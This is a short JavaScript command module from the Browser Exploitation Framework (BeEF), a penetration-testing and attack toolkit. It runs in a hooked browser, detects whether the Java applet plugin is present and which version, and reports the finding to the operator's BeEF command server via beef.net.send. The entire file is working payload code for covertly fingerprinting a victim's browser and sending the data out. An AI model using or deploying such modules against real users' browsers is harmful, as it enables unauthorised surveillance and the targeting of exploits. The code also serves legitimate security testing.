//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

    var java_ver = false;
    // Walk through the full list of mime types.
    for( var i=0,size=navigator.mimeTypes.length; i<size; i++ )
    {
        // The jpi-version is the plug-in version.  This is the best
        // version to use.
        if( (java_ver = navigator.mimeTypes[i].type.match(/^application\/x-java-applet;jpi-version=(.*)$/)) !== null )
        {	java_ver = java_ver[1]
            break;
        }
    }
    var result =  java_ver ? "Yes, version: " + java_ver: "No";


    beef.net.send("<%= @command_url %>", <%= @command_id %>, "java_enabled="+result);

});

